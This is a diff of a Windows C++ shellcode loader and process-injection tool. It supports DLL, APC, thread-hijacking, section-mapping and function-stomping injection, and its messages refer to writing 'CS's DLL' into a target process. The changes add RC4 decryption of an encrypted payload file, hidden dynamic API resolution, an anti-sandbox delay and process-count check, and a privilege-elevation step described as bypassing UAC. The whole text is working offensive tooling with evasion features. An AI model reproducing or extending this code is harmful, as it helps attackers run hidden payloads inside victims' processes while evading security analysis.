@@ -1,12 +1,14 @@
 #include<iostream>
 #include<tchar.h>
-#include<string>
 #include<Windows.h>
-#include<memoryapi.h>
 #include<Tlhelp32.h>
 #include  "def.h"
 #pragma comment(lib, "onecore.lib")
 using namespace std;
+
+DWORD flag = 0;
+unsigned char s[256];
+unsigned char key[256] = { 0x1b, 0x19, 0x7b, 0x1b, 0x9f, 0x10 };
 
 typedef struct Initialization
 {
@@ -33,9 +35,9 @@ typedef struct Initialization
 
 Initialization func = { 0 };
 
-BOOL Win32()
+BOOL WinFunc()
 {
-	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
+	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
 	func.Hide_VirtualProtectEx = (Fn_VirtualProtectEx)GetProcAddress(hKernel32, "VirtualProtectEx");
 	func.Hide_WaitForSingleObject = (Fn_WaitForSingleObject)GetProcAddress(hKernel32, "WaitForSingleObject");
 	func.Hide_CreateFileMappingW = (Fn_CreateFileMappingW)GetProcAddress(hKernel32, "CreateFileMappingW");
@@ -65,10 +67,41 @@ BOOL Win32()
 		return FALSE;
 }
 
+void RC4_init(unsigned char* p, unsigned char* key, DWORD length)
+{
+	for (int i = 0; i < 256; i++)
+	{
+		s[i] = i;
+	}
+
+	int j = 0;
+	for (int i = 0; i < 256; i++)
+	{
+		j = (j + s[i] + key[i % length]) % 256;
+		unsigned char temp = s[i];
+		s[i] = s[j];
+		s[j] = temp;
+	}
+}
+
+void RC4Cipher(unsigned char* file, DWORD length)
+{
+	int i = 0, j = 0;
+	for (int k = 0; k < length; k++)
+	{
+		i = (i + 1) % 256;
+		j = (j + s[i]) % 256;
+
+		unsigned char temp = s[i];
+		s[i] = s[j];
+		s[j] = temp;
+		file[k] ^= s[(s[i] + s[j]) % 256];
+	}
+}
 
 WCHAR* CharToWchar(char* str)
 {
-	int charLength = (int)(strlen(str) + 1); // +1 for null terminator
+	int charLength = (int)(strlen(str) + 1);
 	int wcharLength = MultiByteToWideChar(CP_ACP, 0, str, charLength, NULL, 0);
 	wchar_t* wcharString = (wchar_t*)calloc(wcharLength * sizeof(wchar_t), 2);
 	MultiByteToWideChar(CP_ACP, 0, str, charLength, wcharString, wcharLength);
@@ -92,36 +125,86 @@ BOOL EnableDebugPrivilege()
 	return fOk;
 }
 
-DWORD GetProcessPID(LPCTSTR lpProcessName)
+DWORD EnumProcesses(int flag, LPCWSTR ProcessName)
 {
+	DWORD cnt = 0;
 	DWORD Ret = 0;
-	PROCESSENTRY32 p32;
 	HANDLE lpSnapshot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 p32;
 	if (lpSnapshot == INVALID_HANDLE_VALUE)
-	{
 		return Ret;
-	}
 	p32.dwSize = sizeof(PROCESSENTRY32);
 	::Process32First(lpSnapshot, &p32);
-	do {
-		if (!lstrcmp(p32.szExeFile, lpProcessName))
+
+	if (flag == 1)
+	{
+		int cnt = 1;
+		while (Process32Next(lpSnapshot, &p32))
+			cnt++;
+		return cnt;
+	}
+	else if (flag == 2)
+	{
+		int cnt = 0;
+		cout << "	[+] Below Are The Process PID :) " << endl;
+		do {
+
+			if (!lstrcmp(p32.szExeFile, ProcessName)) {
+				cnt++;
+				cout << p32.th32ProcessID << endl;
+			}
+		} while (Process32Next(lpSnapshot, &p32));
+
+		if (cnt == 0)
 		{
-			Ret = p32.th32ProcessID;
-			break;
+			cout << "	[-] Process PID Not Found :(" << endl;
+			return FALSE;
 		}
-	} while (::Process32Next(lpSnapshot, &p32));
-	::CloseHandle(lpSnapshot);
-	return Ret;
+
+		cout << "	[+] Which Thread's PID Do You Wanna HiJack :)" << endl;
+		cout << "	[!] This May Cause Process Collapse , Watch Out [!]" << endl;
+		return TRUE;
+	}
+	else if (flag == 3)
+	{
+		do {
+			if (!lstrcmp(p32.szExeFile, ProcessName))
+			{
+				Ret = p32.th32ProcessID;
+				break;
+			}
+		} while (Process32Next(lpSnapshot, &p32));
+		CloseHandle(lpSnapshot);
+		return Ret;
+	}
+
+}
+
+void Decryptfile(PVOID buffer, DWORD length)
+{
+	RC4_init(s, key, sizeof(key));
+	RC4Cipher((unsigned char*)buffer, length);
+	cout << "	[+] Decrypt Successfully :)" << endl;
 }
 
 void APCInject(DWORD pid, LPCWSTR dllpath)
 {
-	//1.获取句柄
-	HANDLE TargetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
-	if (TargetHandle == NULL)
+	HANDLE  threadHandle = INVALID_HANDLE_VALUE;
+	HANDLE  snapShot = INVALID_HANDLE_VALUE;
+	HANDLE  targetHandle = INVALID_HANDLE_VALUE;
+	BOOL    writeStatus = 1;
+	DWORD   length = 0;
+	DWORD   flag = 0;
+	PVOID   RemoteMemory = NULL;
+	FARPROC loadLibraryAddress = NULL;
+	THREADENTRY32 te = { 0 };
+
+	targetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
+
+	if (targetHandle == INVALID_HANDLE_VALUE)
 	{
 		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
-		if (EnableDebugPrivilege() == TRUE)
+		if (flag == 1)
 		{
 			cout << "	[-] Is This EXE Opened? :(" << endl;
 		}
@@ -134,9 +217,8 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
 	}
 
-	//2.远程申请内存
-	DWORD length = (wcslen(dllpath) + 2) * sizeof(TCHAR);
-	PVOID RemoteMemory = func.Hide_VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
+	length = (wcslen(dllpath) + 2) * sizeof(TCHAR);
+	RemoteMemory = func.Hide_VirtualAllocEx(targetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
 	if (RemoteMemory == NULL)
 	{
 		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
@@ -145,10 +227,10 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 	else {
 		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
 	}
-	//3.将上线的DLL的路径写入内存
 
-	BOOL WriteStatus = func.Hide_WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
-	if (WriteStatus == 0)
+
+	writeStatus = func.Hide_WriteProcessMemory(targetHandle, RemoteMemory, (PVOID)dllpath, length, NULL);
+	if (writeStatus == 0)
 	{
 		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
 		return;
@@ -158,8 +240,8 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
 	}
 
-	FARPROC LoadLibraryAddress = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
-	if (LoadLibraryAddress == NULL)
+	loadLibraryAddress = GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "LoadLibraryW");
+	if (loadLibraryAddress == NULL)
 	{
 		cout << "	[-] Get LoadLibrary's Address Failed :(" << endl;
 		return;
@@ -169,8 +251,8 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[+] Get LoadLibrary's Address Successfully :)" << endl;
 	}
 
-	HANDLE SnapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
-	if (SnapShot == INVALID_HANDLE_VALUE)
+	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+	if (snapShot == INVALID_HANDLE_VALUE)
 	{
 		cout << "	[-] Taking Thread Snap Shot Failed :(" << endl;
 		return;
@@ -180,47 +262,46 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[+] Taking Thread Snap Shot Successfully :)" << endl;
 	}
 
-	THREADENTRY32 te = { 0 };
+
 	te.dwSize = sizeof(te);
-
-	int flag = 0;
-	HANDLE ThreadHandle = NULL;
-	if (Thread32First(SnapShot, &te))
+	flag = 0;
+	threadHandle = NULL;
+	if (Thread32First(snapShot, &te))
 	{
-
 		if (te.th32OwnerProcessID == pid)
 		{
-			ThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
-			if (ThreadHandle)
+			threadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+			if (threadHandle)
 			{
-				DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
+				DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)loadLibraryAddress, threadHandle, (ULONG_PTR)RemoteMemory);
 				if (dwRet == TRUE)
 				{
 					flag++;
 				}
 			}
-			ThreadHandle = NULL;
+			threadHandle = NULL;
 		}
 
-		while (Thread32Next(SnapShot, &te))
+		while (Thread32Next(snapShot, &te))
 		{
 			if (te.th32OwnerProcessID == pid)
 			{
-				ThreadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
-				if (ThreadHandle)
+				threadHandle = func.Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+				if (threadHandle)
 				{
-					DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
+					DWORD dwRet = func.Hide_QueueUserAPC((PAPCFUNC)loadLibraryAddress, threadHandle, (ULONG_PTR)RemoteMemory);
 					if (dwRet == TRUE)
 					{
 						flag++;
 					}
 				}
-				ThreadHandle = NULL;
+				threadHandle = NULL;
 			}
 		}
-		CloseHandle(TargetHandle);
-		CloseHandle(SnapShot);
-		CloseHandle(ThreadHandle);
+
+		CloseHandle(targetHandle);
+		CloseHandle(snapShot);
+		CloseHandle(threadHandle);
 		if (flag == 0)
 		{
 			cout << "	[-] APC Inject Failed :(" << endl;
@@ -235,34 +316,38 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 
 void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
 {
+	unsigned char* remoteShellCodeBuffer = NULL;
 	unsigned char* tempbuffer = NULL;
-	DWORD          fileLength = 0;
-	HANDLE         fileHandle = NULL;
-	fileHandle = func.Hide_CreateFileW(binPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE			targetProcessHandle = INVALID_HANDLE_VALUE;
+	HANDLE			targetThreadHandle = INVALID_HANDLE_VALUE;
+	HANDLE			snapShot = INVALID_HANDLE_VALUE;
+	HANDLE			fileHandle = INVALID_HANDLE_VALUE;
+	DWORD			fileLength = 0;
+	DWORD           resumeCount = 0;
+	DWORD			suspendCount = 0;
+	THREADENTRY32	t32;
+	CONTEXT			ThreadCtx;
+
+	ThreadCtx.ContextFlags = CONTEXT_FULL;
+	t32.dwSize = sizeof(THREADENTRY32);
+	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	Thread32First(snapShot, &t32);
+
+	fileHandle = func.Hide_CreateFileW(binPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	fileLength = func.Hide_GetFileSize(fileHandle, NULL);
 
 	tempbuffer = (unsigned char*)malloc(fileLength);
+
 	func.Hide_ReadFile(fileHandle, tempbuffer, fileLength, NULL, NULL);
 
-	DWORD resumeCount = 0;
-	DWORD suspendCount = 0;
-	HANDLE targetProcessHandle;
-	unsigned char* remoteShellCodeBuffer;
-	HANDLE targetThreadHandle = NULL;
-	HANDLE snapShot;
-	THREADENTRY32 t32;
-	CONTEXT ThreadCtx;
-	ThreadCtx.ContextFlags = CONTEXT_FULL;
-	t32.dwSize = sizeof(THREADENTRY32);
+	Decryptfile(tempbuffer, fileLength);
 
 	targetProcessHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+
 	remoteShellCodeBuffer = (unsigned char*)func.Hide_VirtualAllocEx(targetProcessHandle, NULL, sizeof(tempbuffer), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
 	func.Hide_WriteProcessMemory(targetProcessHandle, remoteShellCodeBuffer, tempbuffer, fileLength, NULL);
-
-	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-	Thread32First(snapShot, &t32);
 
 	while (Thread32Next(snapShot, &t32))
 	{
@@ -273,6 +358,7 @@ void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
 		}
 	}
 	func.Hide_SuspendThread(targetThreadHandle);
+
 	if (suspendCount == (DWORD)-1)
 	{
 		cout << "	[-]Suspend Target Thread Failed :(" << endl;
@@ -316,35 +402,6 @@ end:
 	CloseHandle(targetThreadHandle);
 }
 
-BOOL TraverseProcess(LPCWSTR ProcessName)
-{
-	int cnt = 0;
-	HANDLE snapShot;
-	PROCESSENTRY32 p32 = { 0 };
-	p32.dwSize = sizeof(PROCESSENTRY32);
-
-	snapShot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-	Process32First(snapShot, &p32);
-
-	cout << "	[+] Below Are The Process PID :) " << endl;
-	do {
-
-		if (!lstrcmp(p32.szExeFile, (LPCWSTR)ProcessName)) {
-			cnt++;
-			cout << p32.th32ProcessID << endl;
-		}
-	} while (Process32Next(snapShot, &p32));
-
-	if (cnt == 0)
-	{
-		cout << "	[-] Process PID Not Found :(" << endl;
-		return FALSE;
-	}
-	cout << "	[+] Which Thread's PID Do You Wanna HiJack :)" << endl;
-	cout << "	[!] This May Cause Process Collapse , Watch Out [!]" << endl;
-
-	return TRUE;
-}
 void FunctionStomping(LPCWSTR targetName, LPCWSTR binFile)
 {
 	char		dllName[MAX_PATH];
@@ -362,7 +419,7 @@ void FunctionStomping(LPCWSTR targetName, LPCWSTR binFile)
 	cin >> dllName >> functionName;
 	WCHAR* convertName = CharToWchar(dllName);
 
-	targetProcessPID = GetProcessPID(targetName);
+	targetProcessPID = EnumProcesses(3, targetName);
 	if (targetProcessPID == 0)
 	{
 		cout << "	[-] Get Target ProcessPID Failed :(" << endl;
@@ -385,8 +442,11 @@ void FunctionStomping(LPCWSTR targetName, LPCWSTR binFile)
 		goto END;
 	cout << "	[+] Read Bin File Into Memory Successfully :)" << endl;
 
+	//Decryptfile(fileBuffer, fileSize);
+
 	func.Hide_LoadLibraryW(convertName);
 	stompAddress = GetProcAddress(GetModuleHandleW(convertName), functionName);
+
 	if (stompAddress == NULL)
 	{
 		cout << "	[-] Get Stomp Address Failed :(" << endl;
@@ -399,6 +459,14 @@ void FunctionStomping(LPCWSTR targetName, LPCWSTR binFile)
 	if (targetHandle == INVALID_HANDLE_VALUE)
 	{
 		cout << "	[-] Open Target Process Failed :( " << endl;
+
+		if (flag == 1)
+		{
+			cout << "	[-] Is This EXE Opened? :(" << endl;
+		}
+		else {
+			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
+		}
 		goto END;
 	}
 	else
@@ -406,7 +474,7 @@ void FunctionStomping(LPCWSTR targetName, LPCWSTR binFile)
 
 	func.Hide_VirtualProtectEx(targetHandle, stompAddress, fileSize, PAGE_READWRITE, NULL);
 
-	if (!WriteProcessMemory(targetHandle, stompAddress, fileBuffer, fileSize, &realLength))
+	if (!func.Hide_WriteProcessMemory(targetHandle, stompAddress, fileBuffer, fileSize, &realLength))
 	{
 		cout << "	[-] Write Process Memory Failed :(" << endl;
 		goto END;
@@ -484,6 +552,8 @@ void MappingInject(LPCWSTR targetProcess, LPCWSTR binFile)
 		goto END;
 	cout << "	[+] Read Bin File Into Memory Successfully :)" << endl;
 
+	Decryptfile(fileBuffer, fileSize);
+
 	tempHandle = func.Hide_CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, fileSize, NULL);
 	if (tempHandle == INVALID_HANDLE_VALUE)
 	{
@@ -506,10 +576,17 @@ void MappingInject(LPCWSTR targetProcess, LPCWSTR binFile)
 
 	memcpy(pMapAddress, fileBuffer, fileSize);
 
-	targetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessPID(targetProcess));
-	if (targetHandle == INVALID_HANDLE_VALUE || GetLastError() == 87)
+	targetHandle = func.Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, EnumProcesses(3, targetProcess));
+	if (targetHandle == INVALID_HANDLE_VALUE)
 	{
 		cout << "	[-] Get Target Handle Failed :(" << endl;
+		if (flag == 1)
+		{
+			cout << "	[-] Is This EXE Opened? :(" << endl;
+		}
+		else {
+			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
+		}
 		goto END;
 	}
 	else
@@ -525,7 +602,7 @@ void MappingInject(LPCWSTR targetProcess, LPCWSTR binFile)
 	else
 		cout << "	[+] Mapping Into Remote Memory Successfully :)" << endl;
 
-	//hProcess = CreateRemoteThread(targetHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
+
 	if (ZwCreateThreadEx(&hProcess, PROCESS_ALL_ACCESS, NULL, targetHandle, (LPTHREAD_START_ROUTINE)remoteMemory, 0, 0, 0, 0, 0, NULL))
 	{
 		cout << "	[-] Create Remote Thread Failed :(" << endl;
@@ -555,7 +632,7 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 	{
 		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
 
-		if (EnableDebugPrivilege() == TRUE)
+		if (flag == 1)
 		{
 			cout << "	[-] Is This EXE Opened? :(" << endl;
 		}
@@ -636,6 +713,30 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 	cout << "	[+] DLL inj&ct successfu11y !! Enj0y Hacking Time :) !" << endl;
 }
 
+
+BOOL AntiSandBox()
+{
+	cout << "	[!] Anti SandBoxing, Wait For a While !!" << endl;
+	LARGE_INTEGER start, end, frequency;
+	double seconds = 4.0;
+	double elapsed;
+
+	QueryPerformanceFrequency(&frequency);
+	QueryPerformanceCounter(&start);
+
+	double target = seconds * frequency.QuadPart;
+	do {
+		QueryPerformanceCounter(&end);
+		elapsed = (double)(end.QuadPart - start.QuadPart);
+	} while (elapsed < target);
+
+	elapsed = (double)(end.QuadPart - start.QuadPart) / frequency.QuadPart;
+	if (elapsed < seconds)
+		return FALSE;
+	return EnumProcesses(1, NULL) > 80;
+}
+
+
 void Banner(int type)
 {
 	if (type == 1)
@@ -709,53 +810,12 @@ void Banner(int type)
 )" << std::endl;
 		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
 	}
-	cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
-	if (EnableDebugPrivilege() == TRUE)
-	{
 
-		cout << "-----------------------------!!START!!--------------------------------" << endl;
-		cout << "	[+] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
-	}
-	else {
-		cout << "-----------------------------!!START!!--------------------------------" << endl;
-		cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
-	}
+	cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :>" << endl << "	          Color Picked By Icy Water :)" << endl;
 
 }
-BOOL AntiSandBox()
-{
-	DWORD Ret = 0;
-	PROCESSENTRY32 p32;
-	HANDLE lpSnapshot = func.Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (lpSnapshot == INVALID_HANDLE_VALUE)
-	{
-		printf("	[-] 获取进程快照失败,请重试! Error:%d", ::GetLastError());
-		return Ret;
-	}
-	p32.dwSize = sizeof(PROCESSENTRY32);
-	::Process32First(lpSnapshot, &p32);
-	int cnt = 1;
-	int checkWechatExit = 0;
-	do {
-		cnt++;
-		std::wstring processName(p32.szExeFile);
-		if (processName == L"WeChat.exe")
-		{
-			checkWechatExit = 1;
-		}
-	} while (Process32Next(lpSnapshot, &p32));
 
-	if (checkWechatExit == 0)
-	{
-		return 0;
-	}
-	else
-	{
-		return cnt > 100;
-	}
-}
-
-void TrashData()
+void Trash_Data()
 {
 	int* data = (int*)malloc(70000 * sizeof(int));
 	for (int i = 0; i < 70000; i++)
@@ -767,58 +827,84 @@ void TrashData()
 	{
 		printf("%d", data[i]);
 	}
-	std::cout << "\033[2J\033[1;1H";
 }
 
 int _tmain(int argc, TCHAR* argv[])
 {
+	DWORD pid = 0;
+	DWORD type = 0;
+
 	if (argc == 3) {
 
 		cout << "	Which kind of Injection do you want?" << endl;
-		cout << "	[1]: DLLInject" << endl << "	[2]: APCInject" << endl;
-		cout << "	[3]: ThreadHiJacking" << endl << "	[4]: MappingInject" << endl;
-		cout << "	[5]: FunctionStomping" << endl;
-		int type = 0;
+		cout << "	[1]: DLLInject (DLL)" << endl << "	[2]: APCInject (DLL)" << endl;
+		cout << "	[3]: ThreadHiJacking (BIN)" << endl << "	[4]: MappingInject (BIN)" << endl;
+		cout << "	[5]: FunctionStomping (BIN)" << endl;
+
 		cin >> type;
 		Banner(type);
-		if (Win32())
-			cout << "	[+] Dynamic Call Successfully :)" << endl;
+
+		cout << "	[!] Elevate To System ? " << endl;
+		cout << "	[0]: No     [1]: Yes" << endl;
+
+		cin >> flag;
+		if (flag == 1)
+		{
+			if (!EnableDebugPrivilege())
+			{
+				cout << "-----------------------------!!START!!--------------------------------" << endl;
+				cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
+			}
+			else
+			{
+				cout << "-----------------------------!!START!!--------------------------------" << endl;
+				cout << "	[+] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
+			}
+		}
 		else
 		{
-			TrashData();
-			std::cout << "\033[2J\033[1;1H";
+			cout << "-----------------------------!!START!!--------------------------------" << endl;
+			cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
+		}
+
+
+		if (WinFunc())
+		{
+			cout << "	[+] Dynamic Call Successfully :)" << endl;
+		}
+		else
+		{
 			cout << "	[-] Dynamic Call Failed :(" << endl;
 			return 0;
 		}
+
 		if (AntiSandBox())
+		{
 			cout << "	[+] Anti SandBox Successfully :)" << endl;
+		}
 		else
 		{
-			TrashData();
-			std::cout << "\033[2J\033[1;1H"<<endl<<endl<<endl;
-			cout << "	[-] Don't Run This In SandBox Or Virtual Machine :(" << endl;
+			cout << "	[-] Don't Run This In SandBox  :(" << endl;
 			return 0;
 		}
-		if (type == 1) //DLLInject
-		{
-			DWORD PID = GetProcessPID(argv[1]);
-			DLLInject(PID, argv[2]);
-		}
-		else if (type == 2)  //APCInject
-		{
-			DWORD PID = GetProcessPID(argv[1]);
-			APCInject(PID, argv[2]);
 
-		}
-		else if (type == 3)   //RemoteThreadHiJacking 
+		if (type == 1)
 		{
-			if (!TraverseProcess(argv[1]))
-				return 0;
-			DWORD ProcessPID;
-			cin >> ProcessPID;
-			RemoteThreadHiJacking(ProcessPID, argv[2]);
+			DLLInject(EnumProcesses(3, argv[1]), argv[2]);
 		}
-		else if (type == 4)  //Remote Mapping Inject 
+		else if (type == 2)
+		{
+			APCInject(EnumProcesses(3, argv[1]), argv[2]);
+		}
+		else if (type == 3)
+		{
+			if (!EnumProcesses(2, argv[1]))
+				return 0;
+
+			cin >> pid;
+			RemoteThreadHiJacking(pid, argv[2]);
+		}
+		else if (type == 4)
 		{
 			MappingInject(argv[1], argv[2]);
 		}
@@ -827,16 +913,14 @@ int _tmain(int argc, TCHAR* argv[])
 			FunctionStomping(argv[1], argv[2]);
 		}
 		else {
-			TrashData();
-			cout << "	[-] Please choose the number below :(" << endl;
-			return 0;
+			Trash_Data();
+			cout << "	[-] Please choose the number above :(" << endl;
 		}
 	}
 	else
 	{
-		TrashData();
+		Trash_Data();
 		cout << "	[-] Two Parameters are required" << endl;
-		return 0;
 	}
 
 	return 0;
